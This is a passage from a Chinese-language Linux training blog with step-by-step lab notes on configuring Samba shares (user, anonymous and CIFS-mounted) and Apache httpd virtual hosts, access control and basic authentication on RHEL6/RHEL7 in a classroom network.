class="line">打开浏览器输入\\172.25.0.11\</span><br><span class="line">输入student和uplooking密码后就可以进入服务器中的用户家目录，创建目录aa，以及文件aa下的dd.txt</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端linux</span></span><br><span class="line">[root@rhel7 ~]# smbclient //172.25.0.11/student -U student</span><br><span class="line">Enter student\'s password:</span><br><span class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Aug  4 04:30:31 2016</span><br><span class="line">  ..                                  D        0  Thu Jul  2 03:57:30 2015</span><br><span class="line">  .ssh                               DH        0  Thu Jul  2 04:01:07 2015</span><br><span class="line">  aa                                  D        0  Thu Aug  4 04:30:28 2016</span><br><span class="line">  .bashrc                             H      124  Tue Jul  9 09:24:50 2013</span><br><span class="line">  .bash_logout                        H       18  Tue Jul  9 09:24:50 2013</span><br><span class="line">  .mozilla                           DH        0  Thu Jul  2 03:36:20 2015</span><br><span class="line">  .bash_history                       H        5  Thu Jul  2 04:01:16 2015</span><br><span class="line">  .gnome2                            DH        0  Wed Jul 14 11:55:40 2010</span><br><span class="line">  .bash_profile                       H      176  Tue Jul  9 09:24:50 2013</span><br><span class="line"></span><br><span class="line">		49584 blocks of size 8192. 45707 blocks available</span><br><span class="line">smb: \&gt; get aa</span><br><span class="line">NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \aa</span><br><span class="line">smb: \&gt; cd aa</span><br><span class="line">smb: \aa\&gt; ls</span><br><span class="line">  .                                   D        0  Thu Aug  4 04:30:28 2016</span><br><span class="line">  ..                                  D        0  Thu Aug  4 04:30:31 2016</span><br><span class="line">  dd.txt                              A        2  Thu Aug  4 04:31:01 2016</span><br><span class="line"></span><br><span class="line">		49584 blocks of size 8192. 45707 blocks available</span><br><span class="line">smb: \aa\&gt; get dd.txt</span><br><span class="line">getting file \aa\dd.txt of size 2 as dd.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)</span><br><span class="line">可以查看到了。</span><br><span class="line"></span><br><span class="line">********************************************************************</span><br><span class="line">=====================================================================</span><br><span class="line">匿名用户</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########</span></span></span><br><span class="line">服务器端rhel6</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########</span></span></span><br><span class="line"></span><br><span class="line">1.创建共享目录/var/lib/samba/share</span><br><span class="line">[root@rhel6 ~]# mkdir /var/lib/samba/share</span><br><span class="line">2.修改配置文件</span><br><span class="line">[root@rhel6 ~]# vim /etc/samba/smb.conf</span><br><span class="line">[public]</span><br><span class="line">       comment = Public Stuff</span><br><span class="line">       path = /var/lib/samba/share</span><br><span class="line">       public = yes</span><br><span class="line">       writable = yes</span><br><span class="line">3.重启服务</span><br><span class="line">[root@rhel6 ~]# service smb restart</span><br><span class="line">Shutting down SMB services:                                [  OK  ]</span><br><span class="line">Starting SMB services:                                     [  OK  ]</span><br><span class="line">[root@rhel6 ~]# service nmb restart</span><br><span class="line">Shutting down NMB services:                                [  OK  ]</span><br><span class="line">Starting NMB services:                                     [  OK  ]</span><br><span class="line">4.修改共享目录的UGO权限</span><br><span class="line">[root@rhel6 ~]# ll -d /var/lib/samba/share</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Aug  5 10:27 /var/lib/samba/share</span><br><span class="line">[root@rhel6 ~]# grep nobody /etc/passwd</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin</span><br><span class="line">[root@rhel6 ~]# chown nobody. /var/lib/samba/share</span><br><span class="line">[root@rhel6 ~]# ll -d /var/lib/samba/share</span><br><span class="line">drwxr-xr-x. 2 nobody nobody 4096 Aug  5 10:27 /var/lib/samba/share</span><br><span class="line">[root@rhel6 ~]# touch /var/lib/samba/share</span><br><span class="line">[root@rhel6 ~]# touch /var/lib/samba/share/smb-file&#123;1..5&#125;</span><br><span class="line">[root@rhel6 ~]# chown nobody. /var/lib/samba/share -R</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# service smb stop</span><br><span class="line">Shutting down SMB services:                                [  OK  ]</span><br><span class="line">[root@rhel6 ~]# service smb start</span><br><span class="line">Starting SMB services:                                     [  OK  ]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########</span></span></span><br><span class="line">客户端rhel7</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########</span></span></span><br><span class="line">[root@rhel7 ~]# smbclient -L 172.25.0.11</span><br><span class="line">Enter root\'s password:</span><br><span class="line">Anonymous login successful</span><br><span class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]</span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	public          Disk      Public Stuff</span><br><span class="line"><span class="meta">	IPC$</span><span class="bash">            IPC       IPC Service (Samba Server Version 3.6.9-164.el6)</span></span><br><span class="line">Anonymous login successful</span><br><span class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]</span><br><span class="line"></span><br><span class="line">	Server               Comment</span><br><span class="line">	---------            -------</span><br><span class="line">	RHEL6                Samba Server Version 3.6.9-164.el6</span><br><span class="line"></span><br><span class="line">	Workgroup            Master</span><br><span class="line">	---------            -------</span><br><span class="line">	MYGROUP              RHEL6</span><br><span class="line">[root@rhel7 ~]# smbclient //172.25.0.11/public</span><br><span class="line">Enter root\'s password:</span><br><span class="line">Anonymous login successful</span><br><span class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Aug  4 22:32:12 2016</span><br><span class="line">  ..                                  D        0  Thu Aug  4 22:30:52 2016</span><br><span class="line">  smb-file4                           N        0  Thu Aug  4 22:32:12 2016</span><br><span class="line">  smb-file2                           N        0  Thu Aug  4 22:32:12 2016</span><br><span class="line">  smb-file5                           N        0  Thu Aug  4 22:32:12 2016</span><br><span class="line">  smb-file1                           N        0  Thu Aug  4 22:32:12 2016</span><br><span class="line">  smb-file3                           N        0  Thu Aug  4 22:32:12 2016</span><br><span class="line"></span><br><span class="line">		34505 blocks of size 524288. 26941 blocks available</span><br><span class="line">smb: \&gt; get smb-file1</span><br><span class="line">getting file \smb-file1 of size 0 as smb-file1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span><br><span class="line">smb: \&gt; put rhel7</span><br><span class="line">putting file rhel7 as \rhel7 (0.0 kb/s) (average 0.0 kb/s)</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Aug  4 22:34:46 2016</span><br><span class="line">  ..                                  D        0  Thu Aug  4 22:30:52 2016</span><br><span class="line">  smb-file4                           N        0  Thu Aug  4 22:32:12 2016</span><br><span class="line">  rhel7                               A        0  Thu Aug  4 22:34:46 2016</span><br><span class="line">  smb-file2                           N        0  Thu Aug  4 22:32:12 2016</span><br><span class="line">  smb-file5                           N        0  Thu Aug  4 22:32:12 2016</span><br><span class="line">  smb-file1                           N        0  Thu Aug  4 22:32:12 2016</span><br><span class="line">  smb-file3                           N        0  Thu Aug  4 22:32:12 2016</span><br><span class="line"></span><br><span class="line">		34505 blocks of size 524288. 26941 blocks available</span><br><span class="line">smb: \&gt; exit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########</span></span></span><br><span class="line">客户端windows</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########</span></span></span><br><span class="line">打开浏览器输入\\172.25.0.11\</span><br><span class="line">就能看到public了</span><br><span class="line"></span><br><span class="line">=================================================================</span><br><span class="line">～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～</span><br><span class="line">以类似nfs挂接的方式来共享samba</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##</span></span></span><br><span class="line">客户端</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##</span></span></span><br><span class="line">mount -t cifs //172.25.0.11/student /mnt -o username=student</span><br><span class="line">uplooking</span><br><span class="line"></span><br><span class="line">1.安装软件cifs-utils</span><br><span class="line">[root@rhel7 ~]# yum install -y cifs-utils</span><br><span class="line">2.mount挂载</span><br><span class="line">[root@rhel7 ~]# mount -t cifs //172.25.0.11/student /mnt -o username=student</span><br><span class="line">Password for student@//172.25.0.11/student:  *********</span><br><span class="line">[root@rhel7 ~]# mount|tail -n 1</span><br><span class="line">//172.25.0.11/student on /mnt type cifs (rw,relatime,vers=1.0,cache=strict,username=student,domain=RHEL6,uid=0,noforceuid,gid=0,noforcegid,addr=172.25.0.11,unix,posixpaths,serverino,acl,rsize=1048576,wsize=65536,actimeo=1)</span><br><span class="line">[root@rhel7 ~]# cd /mnt</span><br><span class="line">[root@rhel7 mnt]# ll</span><br><span class="line">total 1024</span><br><span class="line">-rwxrw-r--. 1 500 500 8 Aug  4 22:15 file-student.txt</span><br><span class="line">drwxr-xr-x. 2 500 500 0 Aug  4 22:19 windows</span><br><span class="line"></span><br><span class="line">3.可以设置开机自动挂载，/etc/bashrc或者/etc/profile中</span><br></pre></td></tr></table></figure>


<h3 id="Samba的主配置文件-etc-samba-smb-conf详细解析"><a href="#Samba的主配置文件-etc-samba-smb-conf详细解析" class="headerlink" title="Samba的主配置文件/etc/samba/smb.conf详细解析"></a>Samba的主配置文件/etc/samba/smb.conf详细解析</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">首先是全局配置</span><br><span class="line">【global】</span><br><span class="line">        workgroup = MYGROUP     --&gt;工作组，工作组是windows上的概念</span><br><span class="line">        server string = Samba Server Version %v   --&gt;关于samba的说明</span><br><span class="line"></span><br><span class="line">        netbios name = MYSERVER   --&gt;网络名称</span><br><span class="line"></span><br><span class="line">;       interfaces = lo eth0 192.168.12.2/24 192.168.13.2/24   --&gt;接口网段信息</span><br><span class="line">;       hosts allow = 127. 192.168.12. 192.168.13.    --&gt;允许哪些机器来访问共享</span><br><span class="line"></span><br><span class="line">;       max protocol = SMB2</span><br><span class="line">【logging options】  关于日志的配置</span><br><span class="line"> 	log file = /var/log/samba/log.%m    	日志存放的位置，%m代表日期</span><br><span class="line"> 	max log size = 50			日志的大小限制为50K</span><br><span class="line">【 Standalone Server Options 】 关于安全级别的相关配置</span><br><span class="line">        security = user    --&gt; user代表需要用户名和密码，密码与下面的passdb backend有关，share代表任何来都可以直接访问，server指的是使用外部的密码，需要提供password server = IP的设置值才行。</span><br><span class="line">        passdb backend = tdbsam   --&gt;数据库格式，默认的格式是tdbsam，文职被放置到/var/lib/samba/private/passwd.tdb</span><br><span class="line"></span><br><span class="line">【 Share Definitions 】</span><br><span class="line">[homes]    --&gt;默认情况用户家目录的共享信息</span><br><span class="line">        comment = Home Directories</span><br><span class="line">        browseable = no</span><br><span class="line">        writable = yes</span><br><span class="line">;       valid users = %S</span><br><span class="line">;       valid users = MYDOMAIN\%S</span><br><span class="line">[printers]  --&gt;关于打印机的配置，这是一些例子。下面跟上了一些选项。</span><br><span class="line">        path = /var/spool/samba</span><br><span class="line">        browseable = no</span><br><span class="line">        guest ok = no</span><br><span class="line">        writable = no</span><br><span class="line">        printable = yes</span><br><span class="line">[sharesmb]        --&gt;共享目录名</span><br><span class="line">        comment = 说明</span><br><span class="line">        path = /test    --&gt;共享路径</span><br><span class="line">        public = yes    --&gt;是否所有人都能够访问</span><br><span class="line">        writable = yes  --&gt;是否可以写</span><br><span class="line">        printable = no  --&gt;是否打印，默认是no，写了yes会直接被传递到打印机，可以省略该行</span><br><span class="line">        write list = +staff  --&gt;可写用户列表。我们这里先把这行删掉。</span><br><span class="line">        browsable=no    --&gt;是否可浏览，如果是yes则默认隐藏。</span><br><span class="line">     	  hosts allow= 用来限制主机和网段。谁可以访问。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux简易服务教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux基础服务</tag>
      </tags>
  </entry>
  <entry>
    <title>APACHE WEB服务</title>
    <url>/2016/12/23/booboo_easy_service/05_apache/</url>
    <content><![CDATA[<h3 id="Web基础"><a href="#Web基础" class="headerlink" title="Web基础"></a>Web基础</h3><p>我们平时上网的时候，输入网址的时候都会输入什么，<a href="http://www.baidu.com，对不对，那么这个www是什么呢？这个www代表的是world">www.baidu.com，对不对，那么这个www是什么呢？这个www代表的是world</a> wide web，WWW可以让Web客户端（常用浏览器）访问浏览Web服务器上的页面。 它是一个由许多互相链接的超文本组成的系统，通过互联网访问，在这个系统中，每个有用的事物，称为一样“资源”；并且由一个全局“统一资源标识符”（URL）标识；这些资源通过超文本传输协议（Hypertext Transfer Protocol）传送给用户，而后者通过点击链接来获得资源。</p>
<p>HTTP是Hypertext Transfer Protocol的缩写，即超文本传输协议。 顾名思义，HTTP提供了访问超文本信息的功能，是WWW浏览器和WWW服务器之间的应用层通信协议。HTTP协议是用于分布式协作超文本信息系统的、通用的、面向对象的协议。通过扩展命令，它可用于类似的任务，如域名服务或分布式面向对象系统。WWW使用HTTP协议传输各种超文本页面和数据。</p>
<p>网页文件是用HTML（标准通用标记语言下的一个应用）编写的，可在WWW上传输，能被浏览器识别显示的文本文件。其扩展名是.htm和.html。</p>
<p>Web的服务器最常见的有windows上的IIS，还有linux上的apache。另外还有例如nginx等的轻量级服务器。都是比较常用的一些服务器。我们基础课主要简单介绍一些apache的一个简单搭建。</p>
<h3 id="Apache的简介"><a href="#Apache的简介" class="headerlink" title="Apache的简介"></a>Apache的简介</h3><ul>
<li>HTTP (Web) server、开源、1995年</li>
<li>官网： <a href="http://httpd.apache.org/" target="_blank" rel="noopener">http://httpd.apache.org/</a></li>
</ul>
<p>Apache 起初由 Illinois 大学 Urbana-Champaign 的国家高级计算程序中心开发。此后，Apache 被开放源代码团体的成员不断的发展和加强。Apache 服务器拥有牢靠可信的美誉，已用在超过半数的因特网站中－特别是几乎所有最热门和访问量最大的网站。</p>
<p>开始，Apache只是Netscape网页服务器（现在是Sun ONE）的之外的开放源代码选择。渐渐的，它开始在功能和速度。超越其他的基于Unix的HTTP服务器。1996年4月以来，Apache一直是Internet上最流行的HTTP服务器: 1999年5月它在 57% 的网页服务器上运行；到了2005年7月这个比例上升到了69%。</p>
<p>作者宣称因为这个名字好记才在最初选择它，但是流传最广的解释是（也是最显而易见的）:这个名字来自这么一个事实:当Apache在1995年初开发的时候，它是由当时最流行的HTTP服务器NCSA HTTPd 1.3 的代码修改而成的，因此是“一个修补的（a patchy）”服务器。然而在服务器官方网站的FAQ中是这么解释的:“‘Apache’这个名字是为了纪念名为Apache(印地语)的美洲印第安人土著的一支，众所周知他们拥有高超的作战策略和无穷的耐性”。</p>
<p>Apache的软件名称就叫做httpd，这里要注意一下，这里我们以el6作为服务器，el7作为客户端。</p>
<h3 id="Apache的软件结构"><a href="#Apache的软件结构" class="headerlink" title="Apache的软件结构"></a>Apache的软件结构</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apache</span><br><span class="line">软件			 httpd</span><br><span class="line">					rhel6	httpd-2.2.15-29.el6_4.x86_64</span><br><span class="line">					rhel7	httpd-2.4.6-17.el7.x86_64</span><br><span class="line">service		httpd</span><br><span class="line">daemon		httpd</span><br><span class="line">端口			80</span><br><span class="line">配置文件	/etc/httpd/conf/httpd.conf</span><br><span class="line">				/etc/httpd/conf.d/*.conf</span><br><span class="line">数据文件	/var/www/</span><br><span class="line">				/var/www/uplooking/	www.uplooking.com----网站根目录</span><br><span class="line">日志文件	/var/log/httpd</span><br></pre></td></tr></table></figure>

<h3 id="Apache虚拟主机方案"><a href="#Apache虚拟主机方案" class="headerlink" title="Apache虚拟主机方案"></a>Apache虚拟主机方案</h3><ol>
<li>基于端口的虚拟主机<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www.uplooking.com:80	----&gt;	/var/www/uplooking.com/</span><br><span class="line">www.uplooking.com:8080	----&gt;	/var/www/abc.com/</span><br></pre></td></tr></table></figure></li>
<li>基于名称的虚拟主机<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www.uplooking.com----/var/www/uplooking.com/</span><br><span class="line">www.abc.com----/var/www/abc.com/</span><br></pre></td></tr></table></figure>
<h3 id="Apache实践"><a href="#Apache实践" class="headerlink" title="Apache实践"></a>Apache实践</h3></li>
</ol>
<h4 id="项目实践1：配置基于端口的虚拟主机"><a href="#项目实践1：配置基于端口的虚拟主机" class="headerlink" title="项目实践1：配置基于端口的虚拟主机"></a>项目实践1：配置基于端口的虚拟主机</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">	8080---&gt;</span><span class="bash">/var/www/8080.com/</span></span><br><span class="line">*******************************************</span><br><span class="line">1)修改主配置文件，打开要监听的端口号</span><br><span class="line">[root@rhel6 ~]# vim /etc/httpd/conf/httpd.conf</span><br><span class="line">Listen 80</span><br><span class="line">Listen 8080</span><br><span class="line">2)为不同的虚拟主机创建配置文件</span><br><span class="line">[root@rhel6 conf.d]# pwd</span><br><span class="line">/etc/httpd/conf.d</span><br><span class="line">[root@rhel6 conf.d]# vim 8080.conf</span><br><span class="line">&lt;VirtualHost *:8080&gt;</span><br><span class="line">    ServerAdmin booboo@8080.com</span><br><span class="line">    DocumentRoot /var/www/8080.com</span><br><span class="line">    ServerName www.8080.com</span><br><span class="line">    ErrorLog logs/8080.com-error_log</span><br><span class="line">    CustomLog logs/8080.com-access_log common</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">3.创建网站根目录，并创建网站默认首页</span><br><span class="line">[root@rhel6 conf.d]# mkdir /var/www/8080.com</span><br><span class="line">[root@rhel6 conf.d]# echo 8080.com &gt; /var/www/8080.com/index.html</span><br><span class="line">4.重启服务</span><br><span class="line">[root@rhel6 conf.d]# service httpd start</span><br></pre></td></tr></table></figure>

<p>拓展8081和8082端口</p>
<ol>
<li>关闭selinux</li>
<li>配置selinux安全上下文，允许httpd监听8081和8082端口<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 conf.d]# semanage port -l|grep http</span><br><span class="line">http_cache_port_t              tcp      3128, 8080, 8118, 8123, 10001-10010</span><br><span class="line">http_cache_port_t              udp      3130</span><br><span class="line">http_port_t                    tcp      80, 81, 443, 488, 8008, 8009, 8443, 9000</span><br><span class="line">pegasus_http_port_t            tcp      5988</span><br><span class="line">pegasus_https_port_t           tcp      5989</span><br><span class="line"></span><br><span class="line">[root@rhel6 conf.d]# semanage port -a -t http_port_t -p tcp 8081</span><br><span class="line">[root@rhel6 conf.d]# semanage port -a -t http_port_t -p tcp 8082</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h4 id="项目实践2：配置基于名称的虚拟主机"><a href="#项目实践2：配置基于名称的虚拟主机" class="headerlink" title="项目实践2：配置基于名称的虚拟主机"></a>项目实践2：配置基于名称的虚拟主机</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">	www.taobao.com		/var/www/taobao.com/</span><br><span class="line">	www.abc.com		/var/www/abc.com/</span><br><span class="line">*******************************************************</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####</span></span></span><br><span class="line">服务端</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####</span></span></span><br><span class="line">1.修改主配置文件</span><br><span class="line">[root@rhel6 conf.d]# vim /etc/httpd/conf/httpd.conf</span><br><span class="line">NameVirtualHost *:80</span><br><span class="line">2.创建拓展配置文件</span><br><span class="line">[root@rhel6 conf.d]# vim taobao.conf</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerAdmin booboo@taobao.com</span><br><span class="line">    DocumentRoot /var/www/taobao.com</span><br><span class="line">    ServerName www.taobao.com</span><br><span class="line">    ErrorLog logs/taobao.com-error_log</span><br><span class="line">    CustomLog logs/taobao.com-access_log common</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;Directory "/var/www/taobao.com/"&gt;</span><br><span class="line">    Options Indexes ==&gt;如果没有对应的index文件，就将该目录下的其他文件罗列出来。</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">[root@rhel6 conf.d]# vim abc.conf</span><br><span class="line">[root@rhel6 conf.d]# cat abc.conf</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerAdmin booboo@abc.com</span><br><span class="line">    DocumentRoot /var/www/abc.com</span><br><span class="line">    ServerName www.abc.com</span><br><span class="line">    ErrorLog logs/abc.com-error_log</span><br><span class="line">    CustomLog logs/abc.com-access_log common</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;Directory "/var/www/abc.com/"&gt;</span><br><span class="line">    Options Indexes</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">[root@rhel6 conf.d]# mkdir /var/www/taobao.com</span><br><span class="line">[root@rhel6 conf.d]# mkdir /var/www/abc.com</span><br><span class="line">[root@rhel6 conf.d]# echo www.taobao.com &gt; /var/www/taobao.com/index.html</span><br><span class="line">[root@rhel6 conf.d]# echo www.abc.com &gt; /var/www/abc.com/index.html</span><br><span class="line">[root@rhel6 conf.d]# service httpd restart</span><br><span class="line">==================================================================================================</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####</span></span></span><br><span class="line">客户端</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####</span></span></span><br><span class="line">1.安装elinks软件，bash下的一个网站浏览软件</span><br><span class="line">[root@rhel7 mnt]# yum install -y elinks</span><br><span class="line">2.添加域名解析</span><br><span class="line">[root@rhel7 mnt]# cat /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">172.25.0.11	www.taobao.com</span><br><span class="line">172.25.0.11	www.abc.com</span><br><span class="line">3.通过links命令访问www.taobao.com和www.abc.com</span><br><span class="line">[root@rhel7 mnt]# links www.taobao.com</span><br><span class="line">[root@rhel7 mnt]# links www.abc.com</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####</span></span></span><br><span class="line">-X 带图形化界面的远程登录</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####</span></span></span><br><span class="line">[kiosk@foundation0 Desktop]$ ssh root@172.25.0.10 -X</span><br><span class="line">Last login: Fri Aug  5 03:14:10 2016</span><br><span class="line">/usr/bin/xauth:  file /root/.Xauthority does not exist</span><br><span class="line">[root@rhel7 ~]# firefox</span><br></pre></td></tr></table></figure>


<h4 id="项目实践3：配置基于名称的虚拟主机针对某一个目录做限制"><a href="#项目实践3：配置基于名称的虚拟主机针对某一个目录做限制" class="headerlink" title="项目实践3：配置基于名称的虚拟主机针对某一个目录做限制"></a>项目实践3：配置基于名称的虚拟主机针对某一个目录做限制</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Directory是针对某一个目录做限制的意思。</span><br><span class="line">	Options</span><br><span class="line">		Indexes的意思代表如果没有对应的index文件，就将该目录下的其他文件罗列出来。</span><br><span class="line">		Multiview代表的是多视图</span><br><span class="line">		Follow sysmlink代表允许连接到其他目录。</span><br><span class="line">	AllowOverride None</span><br><span class="line">	最常用的是：</span><br><span class="line">	Order allow,deny</span><br><span class="line">	Allow from All</span><br><span class="line">	deny from 172.25.0.10==&gt;该目录允许所有人，除了172.25.0.11</span><br><span class="line">	或者</span><br><span class="line">	Order deny,allow</span><br><span class="line">	deny from All</span><br><span class="line">	allow from 172.25.0.10==&gt;该目录不允许所有人，除了172.25.0.11</span><br></pre></td></tr></table></figure>

<h4 id="项目实践4：配置基于名称的虚拟主机-别名"><a href="#项目实践4：配置基于名称的虚拟主机-别名" class="headerlink" title="项目实践4：配置基于名称的虚拟主机_别名"></a>项目实践4：配置基于名称的虚拟主机_别名</h4><ul>
<li>别名        alias<ul>
<li>作用在访问该目录的时候,无论之前的虚拟主机站点名是什么,会统一转到某一个指定的目录。</li>
</ul>
</li>
</ul>
<p><code>Alias /download/ /&quot;var/www/soft/&quot;</code></p>
<p>访问 download 目录时,无论站点名是什么,都会交给 var/www/soft/ 去处理,注意:代表目录时,最后一个 / 不能省略</p>
<h4 id="项目实践4：配置基于名称的虚拟主机-用户名和密码访问"><a href="#项目实践4：配置基于名称的虚拟主机-用户名和密码访问" class="headerlink" title="项目实践4：配置基于名称的虚拟主机_用户名和密码访问"></a>项目实践4：配置基于名称的虚拟主机_用户名和密码访问</h4><ul>
<li>1）配置文件中添加认证    AllowOverride AuthConfig<ul>
<li>2）创建认证文件和用户密码    htpasswd -cmb /etc/httpd/test booboo uplooking</li>
<li>3）新增用户和密码        htpasswd -bm /etc/httpd/test tom uplooking</li>
<li>4）删除用户        htpasswd -D /etc/httpd/test jack</li>
<li>5）修改密码        先删除再创建</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">设置用户和密码</span><br><span class="line">&lt;Directory "/var/www/booboo.com/football/"&gt;</span><br><span class="line">Options Indexes MultiViews FollowSymLinks</span><br><span class="line">AllowOverride AuthConfig</span><br><span class="line"><span class="meta">#</span><span class="bash">仅有网页认证 ( 账号密码 ) 可覆写 ;</span></span><br><span class="line">AuthName "student"</span><br><span class="line"><span class="meta">#</span><span class="bash">在要你输入账号与密码的对话窗口中 , 出现的『提示字符』</span></span><br><span class="line">AuthType basic</span><br><span class="line"><span class="meta">#</span><span class="bash"> 认证的类型</span></span><br><span class="line">AuthUserFile "/etc/httpd/test"</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这个目录所使用的账号密码配置文件</span></span><br><span class="line">Require valid-user</span><br><span class="line"><span class="meta">#</span><span class="bash"> 后面接可以使用的账号 , 此处是让该密码文件内的用户都能够登入</span></span><br><span class="line">Order allow,deny</span><br><span class="line">Allow from all</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过htpasswd添加用户和密码</span></span><br><span class="line">[root@rhel6 conf.d]# htpasswd -cmb /etc/httpd/test booboo uplooking</span><br><span class="line">Adding password for user student</span><br><span class="line"><span class="meta">#</span><span class="bash"> 再添加一个用户和密码</span></span><br><span class="line">[root@rhel6 www]# htpasswd -bm /etc/httpd/test tom uplooking</span><br><span class="line">Adding password for user tom</span><br><span class="line">[root@rhel6 www]# htpasswd -bm /etc/httpd/test jack uplooking</span><br><span class="line">Adding password for user jack</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看保存apache用户名和密码的文件内容</span></span><br><span class="line">[root@rhel6 www]# cat /etc/httpd/test</span><br><span class="line">booboo:$apr1$y6g/XYrn$eEOR4WeAPfONSLExj7x2D1</span><br><span class="line">tom:$apr1$epxVgzER$Or7.R0.5s3z8FbPKrOS1e1</span><br><span class="line">jack:$apr1$Alo3.7mf$3CmcCG9mXp7eEALUsa3YY1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除用户</span></span><br><span class="line">[root@rhel6 www]# htpasswd -D /etc/httpd/test jack</span><br><span class="line">Deleting password for user jack</span><br><span class="line">[root@rhel6 www]# cat /etc/httpd/test</span><br><span class="line">booboo:$apr1$y6g/XYrn$eEOR4WeAPfONSLExj7x2D1</span><br><span class="line">tom:$apr1$epxVgzER$Or7.R0.5s3z8FbPKrOS1e1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改用户密码只能先删除再创建</span></span><br><span class="line">[root@rhel6 abc.com]# htpasswd --help</span><br><span class="line">Usage:</span><br><span class="line">	htpasswd [-cmdpsD] passwordfile username</span><br><span class="line">	htpasswd -b[cmdpsD] passwordfile username password</span><br><span class="line"></span><br><span class="line">	htpasswd -n[mdps] username</span><br><span class="line">	htpasswd -nb[mdps] username password</span><br><span class="line"> -c  Create a new file.</span><br><span class="line"> -n  Don\'t update file; display results on stdout.</span><br><span class="line"> -m  Force MD5 encryption of the password.</span><br><span class="line"> -d  Force CRYPT encryption of the password (default).</span><br><span class="line"> -p  Do not encrypt the password (plaintext).</span><br><span class="line"> -s  Force SHA encryption of the password.</span><br><span class="line"> -b  Use the password from the command line rather than prompting for it.</span><br><span class="line"> -D  Delete the specified user.</span><br><span class="line">On Windows, NetWare and TPF systems the '-m' flag is used by default.</span><br><span class="line">On all other systems, the '-p' flag will probably not work.</span><br></pre></td></tr></table></figure>
<h4 id="项目实践5：在rhel7中搭建apahce，实现以下功能"><a href="#项目实践5：在rhel7中搭建apahce，实现以下功能" class="headerlink" title="项目实践5：在rhel7中搭建apahce，实现以下功能"></a>项目实践5：在rhel7中搭建apahce，实现以下功能</h4><ul>
<li><p>配置基于名称的虚拟主机 <a href="http://www.abc.com" target="_blank" rel="noopener">www.abc.com</a> 和 <a href="http://www.uplooking.com" target="_blank" rel="noopener">www.uplooking.com</a></p>
</li>
<li><p>只允许rhel6 172.25.0.11 能够访问 <a href="http://www.uplooking.com" target="_blank" rel="noopener">www.uplooking.com</a> </p>
</li>
</ul>
